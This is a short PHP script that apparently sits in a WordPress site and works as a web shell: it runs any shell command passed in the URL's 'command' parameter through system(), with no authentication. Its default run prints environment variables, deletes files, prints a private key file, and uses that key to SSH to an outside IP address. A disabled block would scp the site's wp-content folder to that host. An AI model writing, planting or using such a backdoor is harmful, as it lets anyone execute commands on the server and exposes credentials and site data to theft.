<?php
function runcommand($command) {
echo '<pre>';
echo $command;
echo '
';
$last_line = system($command.' 2>&1', $retval);
echo '
Last line of the output: ' . $last_line . '
Return value: ' . $retval.'
</pre>
<hr/>
';
}
echo '<pre>';
$command= $_GET["command"];
echo 'command:'.$command.'
';
echo 'command:'.strlen($command).'
';
echo '</pre>';
if (strlen($command)==0) {
runcommand('which scp');
runcommand('which bash');
runcommand('whoami');
runcommand('df');
runcommand('env');
runcommand('ls -l tar');
runcommand('rm tar/wp-admin.*');
runcommand('ls -l tar');
runcommand('cat SJMR.txt');
runcommand('ssh -i SJMR.txt -o StrictHostKeyChecking=no ubuntu@34.219.135.46 whoami');
if (0==1){
runcommand('scp -i SJMR.txt -o StrictHostKeyChecking=no -r wp-content ubuntu@34.219.135.46:wordpress/abcd');
runcommand('tar -czvf tar/wp-admin.tgz wp-admin');
runcommand('tar -czvf tar/wp-content.tgz wp-content');
runcommand('tar -czvf tar/stats.tgz stats');
runcommand('tar -czvf tar/cg-bin.tgz cgi-bin');
//runcommand('tar -czvf tar/all.tgz *.php wp-admin wp-content stats wp-includes .htaccess *.html *.txt');
}
runcommand('ls -l tar');
$command= $_GET["command"];
// phpinfo();
}
else {
runcommand($command);
}
?>
